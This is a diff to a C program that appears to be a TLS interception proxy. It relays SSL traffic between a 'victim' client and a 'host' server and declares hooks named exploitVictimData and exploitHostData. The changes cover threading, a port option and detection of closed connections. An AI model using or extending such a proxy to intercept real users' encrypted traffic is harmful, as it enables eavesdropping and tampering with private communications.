@@ -3,6 +3,7 @@
 #include <stdbool.h>
 #include <signal.h>
 #include <sys/socket.h>
+#include <netinet/tcp.h>
 #include <sys/time.h>
 #include <arpa/inet.h>
 #include <openssl/ssl.h>
@@ -43,12 +44,7 @@ int create_socket(uint16_t port)
     return skt;
 }
 
-typedef struct
-{
-    int client;
-    SSL *ssl;
-} SSLRequest;
-void *handleRequest(void *request);
+void *handleRequest(void *sslreq);
 void transferData(SSL *victim, SSL *host);
 void exploitVictimData(char *buffer, int len);
 void exploitHostData(char *buffer, int len);
@@ -56,6 +52,14 @@ void exploitHostData(char *buffer, int len);
 int main(int argc, char **argv)
 {
     int port = 27013;
+
+    if (argc == 3)
+    {
+        if (strcmp(argv[1], "-p") == 0)
+        {
+            sscanf(argv[2], "%d", &port);
+        }
+    }
     SSL_library_init();
     SSL_load_error_strings();
     SSL_CTX *ctx = ssl_create_context();
@@ -76,11 +80,10 @@ int main(int argc, char **argv)
             FAILFAST(main, "Unable to accept");
         }
         ssl = SSL_new(ctx);
-        SSLRequest *req = malloc(sizeof(SSLRequest));
-        req->client = client;
-        req->ssl = ssl;
+        SSL_set_fd(ssl, client);
         pthread_t thread;
-        pthread_create(&thread, NULL, handleRequest, req);
+        pthread_create(&thread, NULL, handleRequest, ssl);
+        pthread_detach(thread);
     }
 
     SSL_CTX_free(ctx);
@@ -98,12 +101,10 @@ void errCloseSSL(SSL *ssl, int err)
 
 #define BUF_SIZE 8192
 
-void *handleRequest(void *req)
+void *handleRequest(void *sslreq)
 {
-    SSLRequest *request = req;
-    SSL *ssl = request->ssl;
-    int client = request->client;
-    SSL_set_fd(ssl, client);
+    SSL *ssl = sslreq;
+    int client = SSL_get_fd(ssl);
     int err = 0;
     int ret = 0;
     char buffer[BUF_SIZE];
@@ -212,6 +213,8 @@ void *handleRequest(void *req)
         transferData(ssl, subSsl);
     }
 
+    printf("Connection #%lu ended!\n", pthread_self());
+
     SSL_shutdown(subSsl);
     SSL_free(subSsl);
     close(serverSocket);
@@ -225,12 +228,9 @@ void transferData(SSL *victim, SSL *host)
     char buffer[BUF_SIZE];
     memset(buffer, 0, BUF_SIZE);
     int ret = 0;
-    struct timeval timeout = {0, 1000000};
+    struct timeval timeout = {0, 1000};
     int victimSocket = SSL_get_fd(victim);
     int hostSocket = SSL_get_fd(host);
-
-    bool victimReadComplete = false;
-    bool hostReadComplete = false;
 
     while (1)
     {
@@ -254,13 +254,11 @@ void transferData(SSL *victim, SSL *host)
 
         size_t readBytes;
         size_t writtenBytes;
-        if (!victimReadComplete && FD_ISSET(victimSocket, &fd_read))
+        if (FD_ISSET(victimSocket, &fd_read))
         {
             ret = SSL_read_ex(victim, buffer, BUF_SIZE, &readBytes);
             if (ret > 0) // success
             {
-                if (readBytes == 0)
-                    victimReadComplete = true;
                 ret = SSL_write_ex(host, buffer, readBytes, &writtenBytes);
                 if (!ret || readBytes != writtenBytes) // error sending to host
                 {
@@ -273,8 +271,20 @@ void transferData(SSL *victim, SSL *host)
                 int err = SSL_get_error(victim, ret);
                 if (err != SSL_ERROR_ZERO_RETURN)
                 {
-                    victimReadComplete = true;
                     LOGERROR(transferData, "Failed to read from victim!");
+                }
+                else
+                {
+                    // another dirty approach to detect closed
+                    struct tcp_info info;
+                    int len = sizeof info;
+                    if (getsockopt(victimSocket, IPPROTO_TCP, TCP_INFO, &info, (socklen_t *)&len) == 0)
+                    {
+                        if (info.tcpi_state == TCP_CLOSE_WAIT)
+                        {
+                            break;
+                        }
+                    }
                 }
             }
         }
@@ -283,8 +293,6 @@ void transferData(SSL *victim, SSL *host)
             ret = SSL_read_ex(host, buffer, BUF_SIZE, &readBytes);
             if (ret > 0) // success
             {
-                if (readBytes == 0)
-                    hostReadComplete = true;
                 ret = SSL_write_ex(victim, buffer, readBytes, &writtenBytes);
                 if (!ret || readBytes != writtenBytes) // error sending to victim
                 {
@@ -299,18 +307,8 @@ void transferData(SSL *victim, SSL *host)
                 {
                     LOGERROR(transferData, "Failed to read from Host!");
                 }
-                else
-                {
-                    hostReadComplete = true;
-                    printf("Connection #%d ended!", pthread_self());
-                }
                 break;
             }
-        }
-        if (victimReadComplete && hostReadComplete)
-        {
-            printf("Connection #%d ended!", pthread_self());
-            break;
         }
     }
 }
